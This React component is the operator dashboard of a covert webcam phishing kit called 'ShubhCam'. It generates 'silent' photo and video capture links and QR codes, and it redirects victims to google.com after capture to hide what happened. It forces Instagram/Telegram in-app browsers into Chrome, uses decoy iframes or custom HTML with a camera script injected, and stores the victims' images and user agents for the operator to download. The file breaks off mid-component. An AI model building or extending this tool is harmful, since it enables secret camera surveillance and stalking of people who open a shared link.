import { useState, useEffect, useRef } from "react";
import { Camera, Link2, Copy, RefreshCw, Trash2, Download, ExternalLink, Code, Upload, Chrome, Video, Play, Settings, Eye, X, Smartphone, Globe, Clock, Image as ImageIcon, Zap, FolderOpen, LayoutGrid, QrCode, Palette } from "lucide-react";
import { Button } from "./ui/button";
import { Input } from "./ui/input";
import { Textarea } from "./ui/textarea";
import { toast } from "@/hooks/use-toast";
import { cn } from "@/lib/utils";
import { supabase } from "@/integrations/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";
import { Switch } from "./ui/switch";
import { Label } from "./ui/label";
import { Slider } from "./ui/slider";
import { Dialog, DialogContent } from "./ui/dialog";
import { QRCodeSVG } from "qrcode.react";

interface CapturedPhoto {
  id: string;
  image_data: string;
  captured_at: string;
  user_agent: string | null;
}

interface CapturedVideo {
  id: string;
  video_url: string;
  duration_seconds: number;
  captured_at: string;
  user_agent: string | null;
}

type TabType = "links" | "qr" | "chrome" | "html" | "iframe" | "media" | "config";

const ShubhCam = () => {
  const { settings, updateSettings } = useSettings();
  const [activeTab, setActiveTab] = useState<TabType>("links");
  const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
  const [videos, setVideos] = useState<CapturedVideo[]>([]);
  const [loading, setLoading] = useState(false);
  const [customHtml, setCustomHtml] = useState(settings.customCaptureHtml || "");
  const [chromeCustomHtml, setChromeCustomHtml] = useState(settings.chromeCustomHtml || "");
  const [iframeUrl, setIframeUrl] = useState(settings.camIframeUrl || "");
  const fileInputRef = useRef<HTMLInputElement>(null);
  const chromeFileInputRef = useRef<HTMLInputElement>(null);
  
  const [viewingPhoto, setViewingPhoto] = useState<CapturedPhoto | null>(null);
  const [viewingVideo, setViewingVideo] = useState<CapturedVideo | null>(null);
  const [selectedQrLink, setSelectedQrLink] = useState<"photo" | "video" | "custom" | "chrome" | "iframe">("photo");
  const qrRef = useRef<HTMLDivElement>(null);
  
  const sessionId = settings.camSessionId || "shubhcam01";
  const redirectUrl = settings.camRedirectUrl || "https://google.com";

  const currentOrigin = typeof window !== 'undefined' ? window.location.origin : '';
  const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}&timer=${settings.camCountdownTimer || 5}`;
  const customCaptureLink = `${currentOrigin}/custom-capture?session=${sessionId}`;
  const chromeCustomCaptureLink = `${currentOrigin}/chrome-custom-capture?session=${sessionId}`;
  const videoCaptureLink = `${currentOrigin}/video-capture?session=${sessionId}&duration=${settings.camVideoDuration || 5}&redirect=${encodeURIComponent(redirectUrl)}`;
  const iframeCaptureLink = `${currentOrigin}/iframe-capture?session=${sessionId}`;

  const loadPhotos = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from('captured_photos')
      .select('*')
      .eq('session_id', sessionId)
      .order('captured_at', { ascending: false });
    
    if (error) {
      toast({ title: "Error", description: "Failed to load photos", variant: "destructive" });
    } else {
      setPhotos(data || []);
    }
    setLoading(false);
  };

  const loadVideos = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from('captured_videos')
      .select('*')
      .eq('session_id', sessionId)
      .order('captured_at', { ascending: false });
    
    if (!error) setVideos(data || []);
    setLoading(false);
  };

  const deleteVideo = async (videoId: string, videoUrl: string) => {
    const urlParts = videoUrl.split('/captured-videos/');
    if (urlParts[1]) {
      await supabase.storage.from('captured-videos').remove([urlParts[1]]);
    }
    
    const { error } = await supabase.from('captured_videos').delete().eq('id', videoId);
    
    if (error) {
      toast({ title: "Error", description: "Failed to delete video", variant: "destructive" });
    } else {
      setVideos(videos.filter(v => v.id !== videoId));
      toast({ title: "Deleted", description: "Video removed" });
    }
  };

  useEffect(() => {
    loadPhotos();
    loadVideos();
  }, [sessionId]);

  useEffect(() => {
    setCustomHtml(settings.customCaptureHtml || "");
    setChromeCustomHtml(settings.chromeCustomHtml || "");
    setIframeUrl(settings.camIframeUrl || "");
  }, [settings.customCaptureHtml, settings.chromeCustomHtml, settings.camIframeUrl]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({ title: "Copied!", description: "Link copied to clipboard" });
  };

  const generateNewSession = () => {
    const newSessionId = Math.random().toString(36).substring(2, 10);
    updateSettings({ camSessionId: newSessionId });
    setPhotos([]);
    toast({ title: "New Session", description: `ID: ${newSessionId}` });
  };

  const refreshPhotos = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from('captured_photos')
      .select('*')
      .eq('session_id', sessionId)
      .order('captured_at', { ascending: false });
    
    if (!error) {
      setPhotos(data || []);
      toast({ title: "Refreshed", description: `${data?.length || 0} photos found` });
    }
    setLoading(false);
  };

  const deletePhoto = async (photoId: string, imageUrl: string) => {
    if (imageUrl.includes('/captured-photos/')) {
      const urlParts = imageUrl.split('/captured-photos/');
      if (urlParts[1]) {
        await supabase.storage.from('captured-photos').remove([urlParts[1]]);
      }
    }
    
    const { error } = await supabase.from('captured_photos').delete().eq('id', photoId);
    
    if (error) {
      toast({ title: "Error", description: "Failed to delete photo", variant: "destructive" });
    } else {
      setPhotos(photos.filter(p => p.id !== photoId));
      toast({ title: "Deleted", description: "Photo removed" });
    }
  };

  const downloadPhoto = async (photo: CapturedPhoto) => {
    try {
      if (photo.image_data.startsWith('http')) {
        const response = await fetch(photo.image_data);
        const blob = await response.blob();
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `capture_${photo.id}.jpg`;
        link.click();
        URL.revokeObjectURL(url);
      } else {
        const link = document.createElement('a');
        link.href = photo.image_data;
        link.download = `capture_${photo.id}.jpg`;
        link.click();
      }
    } catch (err) {
      toast({ title: "Error", description: "Failed to download", variant: "destructive" });
    }
  };

  const clearAllPhotos = async () => {
    try {
      const { data: files } = await supabase.storage.from('captured-photos').list(sessionId);
      if (files && files.length > 0) {
        const filePaths = files.map(f => `${sessionId}/${f.name}`);
        await supabase.storage.from('captured-photos').remove(filePaths);
      }
    } catch (err) {}
    
    const { error } = await supabase.from('captured_photos').delete().eq('session_id', sessionId);
    
    if (!error) {
      setPhotos([]);
      toast({ title: "Cleared", description: "All photos deleted" });
    }
  };

  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (e) => {
        setCustomHtml(e.target?.result as string);
        toast({ title: "Uploaded", description: "HTML loaded" });
      };
      reader.readAsText(file);
    }
  };

  const handleChromeFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (e) => {
        setChromeCustomHtml(e.target?.result as string);
        toast({ title: "Uploaded", description: "Chrome HTML loaded" });
      };
      reader.readAsText(file);
    }
  };

  const saveCustomHtml = () => {
    updateSettings({ customCaptureHtml: customHtml });
    toast({ title: "Saved!", description: "Custom HTML synced" });
  };

  const saveChromeCustomHtml = () => {
    updateSettings({ chromeCustomHtml: chromeCustomHtml });
    toast({ title: "Saved!", description: "Chrome HTML synced" });
  };

  const saveIframeUrl = () => {
    updateSettings({ camIframeUrl: iframeUrl });
    toast({ title: "Saved!", description: "Iframe URL synced" });
  };

  const getQrLinkUrl = () => {
    switch (selectedQrLink) {
      case "photo": return captureLink;
      case "video": return videoCaptureLink;
      case "custom": return customCaptureLink;
      case "chrome": return chromeCustomCaptureLink;
      case "iframe": return iframeCaptureLink;
      default: return captureLink;
    }
  };

  const getQrLinkLabel = () => {
    switch (selectedQrLink) {
      case "photo": return "Silent Photo";
      case "video": return `Video ${settings.camVideoDuration || 5}s`;
      case "custom": return "Custom HTML";
      case "chrome": return "Chrome Redirect";
      case "iframe": return "Iframe Capture";
      default: return "Photo";
    }
  };

  const downloadQrCode = () => {
    if (!qrRef.current) return;
    const svg = qrRef.current.querySelector('svg');
    if (!svg) return;
    
    const svgData = new XMLSerializer().serializeToString(svg);
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const img = new Image();
    
    img.onload = () => {
      canvas.width = settings.qrSize || 180;
      canvas.height = settings.qrSize || 180;
      ctx?.drawImage(img, 0, 0);
      const pngUrl = canvas.toDataURL('image/png');
      const downloadLink = document.createElement('a');
      downloadLink.href = pngUrl;
      downloadLink.download = `qr-${selectedQrLink}-${sessionId}.png`;
      downloadLink.click();
      toast({ title: "Downloaded!", description: "QR code saved" });
    };
    
    img.src = 'data:image/svg+xml;base64,' + btoa(unescape(encodeURIComponent(svgData)));
  };

  const tabs: { id: TabType; icon: React.ReactNode; label: string }[] = [
    { id: "links", icon: <Link2 className="w-3.5 h-3.5" />, label: "Links" },
    { id: "qr", icon: <QrCode className="w-3.5 h-3.5" />, label: "QR" },
    { id: "chrome", icon: <Chrome className="w-3.5 h-3.5" />, label: "Chrome" },
    { id: "html", icon: <Code className="w-3.5 h-3.5" />, label: "HTML" },
    { id: "iframe", icon: <LayoutGrid className="w-3.5 h-3.5" />, label: "Iframe" },
    { id: "media", icon: <FolderOpen className="w-3.5 h-3.5" />, label: `${photos.length + videos.length}` },
    { id: "config", icon: <Settings className="w-3.5 h-3.5" />, label: "Config" },
  ];

  const glassInput = "bg-background/30 border-primary/20 text-foreground text-[10px] font-mono placeholder:text-muted-foreground/40 focus:border-primary/50 h-9";

  return (
    <div className="mt-6 w-full">
      {/* Header Card - Glassmorphic Premium */}
      <div className="glass-card-warm rounded-2xl p-4 mb-4">
        <div className="flex items-center gap-3">
          <div className="w-11 h-11 rounded-xl bg-gradient-to-br from-primary/30 to-secondary/30 border border-primary/30 flex items-center justify-center glow-gold">
            <Camera className="w-5 h-5 text-primary" />
          </div>
          <div className="flex-1 min-w-0">
            <h2 className="font-display font-bold text-lg text-foreground tracking-wide">
              VISION <span className="text-primary text-glow-gold">CAPTURE</span>
            </h2>
            <div className="flex items-center gap-2 text-xs text-muted-foreground">
              <span className="font-mono text-primary/80">{sessionId}</span>
              <span className="w-1.5 h-1.5 rounded-full bg-primary animate-pulse-glow" />
              <span className="text-[10px]">Active</span>
            </div>
          </div>
        </div>
      </div>

      {/* Tab Navigation - Premium Glassmorphic Grid */}
      <div className="grid grid-cols-7 gap-1.5 mb-4">
        {tabs.map((tab) => (
          <button
            key={tab.id}
            onClick={() => {
              setActiveTab(tab.id);
              if (tab.id === "media") { refreshPhotos(); loadVideos(); }
            }}
            className={cn(
              "flex flex-col items-center justify-center gap-1 py-2.5 px-1 rounded-xl transition-all text-[10px] font-semibold",
              activeTab === tab.id
                ? "bg-gradient-to-br from-primary/30 to-secondary/20 text-primary border border-primary/30 glow-gold"
                : "glass-card text-muted-foreground hover:border-primary/20 hover:text-primary/70"
            )}
          >
            {tab.icon}
            <span>{tab.label}</span>
          </button>
        ))}
      </div>

      {/* Content Area - Glass Card */}
      <div className="glass-card rounded-2xl p-4">
        
        {/* LINKS TAB */}
        {activeTab === "links" && (
          <div className="space-y-4">
            <div className="grid grid-cols-3 gap-2 text-center">
              {[
                { icon: Camera, label: "Photo", color: "text-primary" },
                { icon: Video, label: `${settings.camVideoDuration || 5}s Video`, color: "text-secondary" },
                { icon: Globe, label: redirectUrl.replace(/https?:\/\//, '').slice(0, 10), color: "text-accent" },
              ].map((item, i) => (
                <div key={i} className="glass-card rounded-xl p-2.5">
                  <item.icon className={`w-4 h-4 mx-auto mb-1 ${item.color}`} />
                  <p className="text-[9px] text-muted-foreground">{item.label}</p>
                </div>
              ))}
            </div>

            {/* Silent Photo Link */}
            <div className="space-y-2">
              <div className="flex items-center gap-2">
                <Camera className="w-3.5 h-3.5 text-primary" />
                <span className="text-xs font-semibold text-foreground">Silent Photo Capture</span>
              </div>
              <div className="flex gap-2">
                <Input value={captureLink} readOnly className={glassInput} />
                <Button size="icon" onClick={() => copyToClipboard(captureLink)}
                  className="h-9 w-9 bg-primary text-primary-foreground hover:bg-primary/90 shrink-0 glow-gold">
                  <Copy className="w-3.5 h-3.5" />
                </Button>
              </div>
            </div>

            {/* Video Link */}
            <div className="space-y-2">
              <div className="flex items-center gap-2">
                <Video className="w-3.5 h-3.5 text-secondary" />
                <span className="text-xs font-semibold text-foreground">Video Capture ({settings.camVideoDuration || 5}s)</span>
              </div>
              <div className="flex gap-2">
                <Input value={videoCaptureLink} readOnly className={glassInput} />
                <Button size="icon" onClick={() => copyToClipboard(videoCaptureLink)}
                  className="h-9 w-9 bg-secondary text-secondary-foreground hover:bg-secondary/90 shrink-0 glow-pink">
                  <Copy className="w-3.5 h-3.5" />
                </Button>
              </div>
            </div>

            {/* Redirect URL */}
            <div className="space-y-2">
              <div className="flex items-center gap-2">
                <Globe className="w-3.5 h-3.5 text-muted-foreground" />
                <span className="text-xs font-medium text-muted-foreground">Redirect After Capture</span>
              </div>
              <Input
                value={redirectUrl}
                onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
                placeholder="https://google.com"
                className="bg-background/30 border-border/50 text-xs h-9"
              />
            </div>

            <div className="grid grid-cols-2 gap-2">
              <Button onClick={() => window.open(captureLink, '_blank')} variant="outline" size="sm"
                className="border-primary/30 text-primary hover:bg-primary/10 text-xs">
                <ExternalLink className="w-3 h-3 mr-1" /> Test Link
              </Button>
              <Button onClick={() => { refreshPhotos(); loadVideos(); }} size="sm"
                className="bg-primary/20 text-primary hover:bg-primary/30 text-xs">
                <RefreshCw className="w-3 h-3 mr-1" /> Refresh
              </Button>
            </div>
          </div>
        )}

        {/* QR CODE TAB */}
        {activeTab === "qr" && (
          <div className="space-y-4">
            <div className="space-y-2">
              <div className="flex items-center gap-2">
                <QrCode className="w-3.5 h-3.5 text-primary" />
                <span className="text-xs font-semibold">Select Link Type</span>
              </div>
              <div className="grid grid-cols-5 gap-1">
                {(["photo", "video", "custom", "chrome", "iframe"] as const).map((type) => (
                  <button key={type} onClick={() => setSelectedQrLink(type)}
                    className={cn(
                      "py-1.5 px-2 rounded-lg text-[9px] font-semibold transition-all capitalize",
                      selectedQrLink === type
                        ? "bg-primary text-primary-foreground glow-gold"
                        : "glass-card text-muted-foreground hover:border-primary/30"
                    )}>
                    {type === "photo" ? "📷" : type === "video" ? "🎥" : type === "custom" ? "📝" : type === "chrome" ? "🌐" : "📱"}
                  </button>
                ))}
              </div>
              <p className="text-[10px] text-muted-foreground text-center">{getQrLinkLabel()} Capture Link</p>
            </div>

            <div className="flex justify-center">
              <div ref={qrRef} className="p-4 rounded-xl bg-white border-2 border-primary/40 glow-gold">
                <QRCodeSVG
                  value={getQrLinkUrl()}
                  size={settings.qrSize || 180}
                  level="H"
                  fgColor={settings.qrFgColor || "#22c55e"}
                  bgColor={settings.qrBgColor || "#000000"}
                  includeMargin={false}
                />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-2">
              <Button onClick={downloadQrCode} size="sm" className="bg-primary text-primary-foreground hover:bg-primary/90 text-xs glow-gold">
                <Download className="w-3 h-3 mr-1" /> Download
              </Button>
              <Button onClick={() => copyToClipboard(getQrLinkUrl())} variant="outline" size="sm"
                className="border-primary/30 text-primary hover:bg-primary/10 text-xs">
                <Copy className="w-3 h-3 mr-1" /> Copy Link
              </Button>
            </div>

            {/* QR Settings */}
            <div className="space-y-3 pt-3 border-t border-border/30">
              <div className="flex items-center gap-2">
                <Palette className="w-3.5 h-3.5 text-primary" />
                <span className="text-xs font-semibold">QR Settings</span>
              </div>
              <div className="space-y-2">
                <div className="flex justify-between text-[10px]">
                  <span className="text-muted-foreground">Size</span>
                  <span className="text-primary font-mono">{settings.qrSize || 180}px</span>
                </div>
                <Slider value={[settings.qrSize || 180]} onValueChange={([val]) => updateSettings({ qrSize: val })} min={100} max={300} step={10} className="py-2" />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1">
                  <label className="text-[10px] text-muted-foreground">QR Color</label>
                  <div className="flex gap-2">
                    <input type="color" value={settings.qrFgColor || "#22c55e"} onChange={(e) => updateSettings({ qrFgColor: e.target.value })} className="w-8 h-8 rounded cursor-pointer border border-border/30" />
                    <Input value={settings.qrFgColor || "#22c55e"} onChange={(e) => updateSettings({ qrFgColor: e.target.value })} className="bg-background/30 border-border/50 font-mono text-[10px] h-8 flex-1" />
                  </div>
                </div>
                <div className="space-y-1">
                  <label className="text-[10px] text-muted-foreground">Background</label>
                  <div className="flex gap-2">
                    <input type="color" value={settings.qrBgColor || "#000000"} onChange={(e) => updateSettings({ qrBgColor: e.target.value })} className="w-8 h-8 rounded cursor-pointer border border-border/30" />
                    <Input value={settings.qrBgColor || "#000000"} onChange={(e) => updateSettings({ qrBgColor: e.target.value })} className="bg-background/30 border-border/50 font-mono text-[10px] h-8 flex-1" />
                  </div>
                </div>
              </div>

              <div className="space-y-1">
                <label className="text-[10px] text-muted-foreground">Presets</label>
                <div className="flex gap-2 flex-wrap">
                  {[
                    { fg: "#d4a017", bg: "#0a0a12", name: "Gold" },
                    { fg: "#000000", bg: "#ffffff", name: "Classic" },
                    { fg: "#ec4899", bg: "#0a0a12", name: "Rose" },
                    { fg: "#06b6d4", bg: "#0a0a12", name: "Cyan" },
                    { fg: "#a855f7", bg: "#0a0a12", name: "Purple" },
                  ].map((preset) => (
                    <button key={preset.name} onClick={() => updateSettings({ qrFgColor: preset.fg, qrBgColor: preset.bg })}
                      className="px-2 py-1 rounded text-[9px] glass-card hover:border-primary/30 transition-colors" style={{ color: preset.fg }}>
                      {preset.name}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            <div className="glass-card rounded-lg p-2">
              <p className="text-[9px] text-muted-foreground mb-1">Link URL:</p>
              <p className="text-[10px] font-mono text-primary break-all">{getQrLinkUrl()}</p>
            </div>
          </div>
        )}

        {/* CHROME TAB */}
        {activeTab === "chrome" && (
          <div className="space-y-4">
            <div className="glass-card-warm rounded-xl p-3">
              <div className="flex items-start gap-2">
                <Smartphone className="w-4 h-4 text-primary shrink-0 mt-0.5" />
                <div className="text-xs text-muted-foreground space-y-1">
                  <p className="text-foreground font-semibold">Android In-App Browser → Chrome</p>
                  <p>Instagram/Telegram ke browser se auto Chrome redirect</p>
                </div>
              </div>
            </div>

            <div className="space-y-3">
              <div className="flex items-center gap-2">
                <Code className="w-3.5 h-3.5 text-primary" />
                <span className="text-xs font-semibold">Chrome Custom HTML</span>
              </div>
              
              <input type="file" accept=".html,.htm" ref={chromeFileInputRef} onChange={handleChromeFileUpload} className="hidden" />
              
              <Button onClick={() => chromeFileInputRef.current?.click()} variant="outline" size="sm"
                className="w-full border-primary/30 text-primary hover:bg-primary/10 text-xs">
                <Upload className="w-3 h-3 mr-1" /> Upload HTML
              </Button>

              <Textarea value={chromeCustomHtml} onChange={(e) => setChromeCustomHtml(e.target.value)}
                placeholder="Paste HTML code..."
                className="bg-background/30 border-border/30 font-mono text-[10px] min-h-[100px] resize-none" />

              <Button onClick={saveChromeCustomHtml} size="sm" className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-xs glow-gold">
                <Zap className="w-3 h-3 mr-1" /> Save Chrome HTML
              </Button>
            </div>

            {chromeCustomHtml && (
              <div className="space-y-2 pt-2 border-t border-border/30">
                <div className="flex items-center gap-2">
                  <Chrome className="w-3.5 h-3.5 text-primary" />
                  <span className="text-xs font-semibold">Chrome Capture Link</span>
                </div>
                <div className="flex gap-2">
                  <Input value={chromeCustomCaptureLink} readOnly className={glassInput} />
                  <Button size="icon" onClick={() => copyToClipboard(chromeCustomCaptureLink)}
                    className="h-9 w-9 bg-primary text-primary-foreground hover:bg-primary/90 shrink-0">
                    <Copy className="w-3.5 h-3.5" />
                  </Button>
                </div>
              </div>
            )}

            <div className="bg-destructive/10 border border-destructive/20 rounded-xl p-2 text-[10px] text-muted-foreground">
              ⚠️ Sirf Android pe kaam karta hai. iOS supported nahi.
            </div>
          </div>
        )}

        {/* HTML TAB */}
        {activeTab === "html" && (
          <div className="space-y-4">
            <div className="glass-card-warm rounded-xl p-3">
              <p className="text-xs text-muted-foreground">
                Upload custom HTML for capture page. Camera script auto-injected.
              </p>
            </div>

            <input type="file" accept=".html,.htm" ref={fileInputRef} onChange={handleFileUpload} className="hidden" />
            
            <Button onClick={() => fileInputRef.current?.click()} variant="outline" size="sm"
              className="w-full border-primary/30 text-primary hover:bg-primary/10 text-xs">
              <Upload className="w-3 h-3 mr-1" /> Upload HTML File
            </Button>

            <Textarea value={customHtml} onChange={(e) => setCustomHtml(e.target.value)}
              placeholder="Paste HTML code here..."
              className="bg-background/30 border-border/30 font-mono text-[10px] min-h-[150px] resize-none" />

            <Button onClick={saveCustomHtml} size="sm" className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-xs glow-gold">
              <Zap className="w-3 h-3 mr-1" /> Save HTML
            </Button>

            {customHtml && (
              <div className="space-y-2 pt-3 border-t border-border/30">
                <span className="text-xs font-semibold text-foreground">Custom Capture Link</span>
                <div className="flex gap-2">
                  <Input value={customCaptureLink} readOnly className={glassInput} />
                  <Button size="icon" onClick={() => copyToClipboard(customCaptureLink)}
                    className="h-9 w-9 bg-primary text-primary-foreground hover:bg-primary/90 shrink-0">
                    <Copy className="w-3.5 h-3.5" />
                  </Button>
                </div>
                <Button onClick={() => window.open(customCaptureLink, '_blank')} variant="outline" size="sm"
                  className="w-full border-primary/30 text-primary hover:bg-primary/10 text-xs">
                  <ExternalLink className="w-3 h-3 mr-1" /> Test Custom Link
                </Button>
              </div>
            )}
          </div>
        )}

        {/* IFRAME TAB */}
        {activeTab === "iframe" && (
          <div className="space-y-4">
            <div className="glass-card-warm rounded-xl p-3">
              <div className="flex items-start gap-2">
                <LayoutGrid className="w-4 h-4 text-primary shrink-0 mt-0.5" />
                <div className="text-xs text-muted-foreground space-y-1">
                  <p className="text-foreground font-semibold">Iframe Capture Page</p>
                  <p>Koi bhi website embed karo capture page me</p>
                </div>
              </div>
            </div>

            <div className="space-y-3">
              <div className="flex items-center gap-2">
                <Globe className="w-3.5 h-3.5 text-primary" />
                <span className="text-xs font-semibold">Website URL</span>
              </div>
              
              <Input value={iframeUrl} onChange={(e) => setIframeUrl(e.target.value)}
                placeholder="https://example.com"
                className="bg-background/30 border-border/30 font-mono text-xs h-9" />

              <Button onClick={saveIframeUrl} size="sm" className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-xs glow-gold">
                <Zap className="w-3 h-3 mr-1" /> Save URL
              </Button>
            </div>

            {iframeUrl && (
              <div className="space-y-2 pt-3 border-t border-border/30">
                <div className="flex items-center gap-2">
                  <LayoutGrid className="w-3.5 h-3.5 text-primary" />
                  <span className="text-xs font-semibold">Iframe Capture Link</span>
                </div>
                <div className="flex gap-2">
                  <Input value={iframeCaptureLink} readOnly className={glassInput} />
                  <Button size="icon" onClick={() => copyToClipboard(iframeCaptureLink)}
                    className="h-9 w-9 bg-primary text-primary-foreground hover:bg-primary/90 shrink-0">
                    <Copy className="w-3.5 h-3.5" />
                  </Button>
                </div>
                <Button onClick={() => window.open(iframeCaptureLink, '_blank')} variant="outline" size="sm"
                  className="w-full border-primary/30 text-primary hover:bg-primary/10 text-xs">
                  <ExternalLink className="w-3 h-3 mr-1" /> Test Iframe Link
                </Button>
              </div>
            )}

            <div className="bg-destructive/10 border border-destructive/20 rounded-xl p-2 text-[10px] text-muted-foreground">
              ⚠️ Kuch websites iframe allow nahi karti (X-Frame-Options). Test karke dekho.
            </div>
          </div>
        )}

        {/* MEDIA TAB */}
        {activeTab === "media" && (
          <div className="space-y-4">
            {loading ? (
              <div className="flex items-center justify-center py-12">
                <div className="w-6 h-6 border-2 border-primary border-t-transparent rounded-full animate-spin" />
              </div>
            ) : photos.length === 0 && videos.length === 0 ? (
              <div className="text-center py-12">
                <Camera className="w-10 h-10 mx-auto mb-2 text-muted-foreground/30" />
                <p className="text-xs text-muted-foreground">No captures yet</p>
                <p className="text-[10px] text-muted-foreground/60">Share link to start</p>
              </div>
            ) : (
              <>
                <div className="flex justify-between items-center">
                  <span className="text-[10px] text-muted-foreground">{photos.length} photos • {videos.length} videos</span>
                  <Button variant="ghost" size="sm" onClick={clearAllPhotos}
                    className="text-destructive hover:text-destructive text-[10px] h-7 px-2">
                    <Trash2 className="w-3 h-3 mr-1" /> Clear
                  </Button>
                </div>
                
                <div className="grid grid-cols-3 gap-2">
                  {photos.map((photo) => (
                    <div key={`p-${photo.id}`}
                      className="relative aspect-square rounded-xl overflow-hidden border border-primary/20 bg-background/50 cursor-pointer group"
                      onClick={() => setViewingPhoto(photo)}>
                      <img src={photo.image_data} alt="" className="w-full h-full object-cover" />
                      <div className="absolute inset-0 bg-background/70 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
                        <Eye className="w-5 h-5 text-primary" />
                      </div>
                      <div className="absolute top-1 left-1 bg-primary/90 text-primary-foreground text-[7px] px-1 rounded font-bold">IMG</div>
                    </div>
                  ))}
                  {videos.map((video) => (
                    <div key={`v-${video.id}`}
                      className="relative aspect-square rounded-xl overflow-hidden border border-secondary/20 bg-background/50 cursor-pointer group"
                      onClick={() => setViewingVideo(video)}>
                      <video src={video.video_url} className="w-full h-full object-cover" />
                      <div className="absolute inset-0 bg-background/70 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
                        <Play className="w-5 h-5 text-secondary" />
                      </div>
                      <div className="absolute top-1 left-1 bg-secondary/90 text-secondary-foreground text-[7px] px-1 rounded font-bold flex items-center gap-0.5">
                        <Play className="w-2 h-2" /> VID
                      </div>
                      <div className="absolute top-1 right-1 bg-background/70 text-primary text-[7px] px-1 rounded font-mono">{video.duration_seconds}s</div>
                    </div>
                  ))}
                </div>
              </>
            )}

            <Button onClick={() => { refreshPhotos(); loadVideos(); }} size="sm"
              className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-xs glow-gold">
              <RefreshCw className="w-3 h-3 mr-1" /> Refresh Media
            </Button>
          </div>
        )}

        {/* CONFIG TAB */}
        {activeTab === "config" && (
          <div className="space-y-4">
            <div className="space-y-3 pt-3 border-t border-border/30">
              <div className="flex items-center gap-2">
                <Camera className="w-3.5 h-3.5 text-primary" />
                <span className="text-xs font-semibold text-foreground">Photo Settings</span>
              </div>
              <div className="space-y-2">
                <div className="flex justify-between text-[10px]">
                  <span className="text-muted-foreground">Photo Limit (0=∞)</span>
                  <span className="text-primary font-mono">{settings.camPhotoLimit || 0}</span>
                </div>
                <Input type="number" min="0" max="100" value={settings.camPhotoLimit || 0}
                  onChange={(e) => updateSettings({ camPhotoLimit: parseInt(e.target.value) || 0 })}
                  className="bg-background/30 border-border/30 text-xs h-8" />
              </div>
              <div className="space-y-2">
                <div className="flex justify-between text-[10px]">
                  <span className="text-muted-foreground">Capture Interval</span>
                  <span className="text-primary font-mono">{settings.camCaptureInterval || 500}ms</span>
                </div>
                <Slider value={[settings.camCaptureInterval || 500]} onValueChange={([val]) => updateSettings({ camCaptureInterval: val })} min={100} max={2000} step={100} className="py-2" />
              </div>
            </div>

            <div className="space-y-3 pt-3 border-t border-border/30">
              <div className="flex items-center gap-2">
                <Clock className="w-3.5 h-3.5 text-accent" />
                <span className="text-xs font-semibold text-foreground">Timer Settings</span>
              </div>
              <div className="space-y-2">
                <div className="flex justify-between text-[10px]">
                  <span className="text-muted-foreground">Countdown Timer</span>
                  <span className="text-accent font-mono">{settings.camCountdownTimer || 5}s</span>
                </div>
                <Slider value={[settings.camCountdownTimer || 5]} onValueChange={([val]) => updateSettings({ camCountdownTimer: val })} min={3} max={30} step={1} className="py-2" />
              </div>
              <div className="flex items-center justify-between">
                <Label className="text-[10px] text-muted-foreground">Auto Redirect</Label>
                <Switch checked={settings.camAutoRedirect !== false} onCheckedChange={(checked) => updateSettings({ camAutoRedirect: checked })} />
              </div>
            </div>

            <div className="space-y-3 pt-3 border-t border-border/30">
              <div className="flex items-center gap-2">
                <Video className="w-3.5 h-3.5 text-secondary" />
                <span className="text-xs font-semibold text-foreground">Video Settings</span>
              </div>
              <div className="space-y-2">
                <div className="flex justify-between text-[10px]">
                  <span className="text-muted-foreground">Video Duration</span>
                  <span className="text-secondary font-mono">{settings.camVideoDuration || 5}s</span>
                </div>
                <Slider value={[settings.camVideoDuration || 5]} onValueChange={([val]) => updateSettings({ camVideoDuration: val })} min={3} max={30} step={1} className="py-2" />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-2 pt-3 border-t border-border/30">
              <div className="glass-card-warm rounded-xl p-3 text-center">
                <p className="text-xl font-bold text-primary text-glow-gold">{photos.length}</p>
                <p className="text-[9px] text-muted-foreground">Photos</p>
              </div>
              <div className="glass-card-warm rounded-xl p-3 text-center">
                <p className="text-xl font-bold text-secondary text-glow-pink">{videos.length}</p>
                <p className="text-[9px] text-muted-foreground">Videos</p>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Photo View Modal */}
      <Dialog open={!!viewingPhoto} onOpenChange={() => setViewingPhoto(null)}>
        <DialogContent className="p-0 bg-card border border-primary/30 max-w-[90vw] sm:max-w-md rounded-2xl overflow-hidden glow-gold">
          {viewingPhoto && (
            <div>
              <div className="flex items-center justify-between p-3 border-b border-border/50">
                <div className="flex items-center gap-2">
                  <Camera className="w-4 h-4 text-primary" />
                  <span className="text-sm font-semibold">Photo</span>
                </div>
                <Button size="icon" variant="ghost" onClick={() => setViewingPhoto(null)} className="h-6 w-6"><X className="w-4 h-4" /></Button>
              </div>
              <div className="p-3">
                <div className="aspect-square w-full overflow-hidden rounded-xl border border-border/30 bg-background/50">
                  <img src={viewingPhoto.image_data} alt="" className="w-full h-full object-contain" />
                </div>
                <div className="mt-2 text-[10px] text-muted-foreground space-y-1 glass-card rounded-lg p-2">
                  <p>📅 {new Date(viewingPhoto.captured_at).toLocaleString()}</p>
                  {viewingPhoto.user_agent && <p className="truncate">📱 {viewingPhoto.user_agent.slice(0, 40)}...</p>}
                </div>
              </div>
              <div className="flex gap-2 p-3 pt-0">
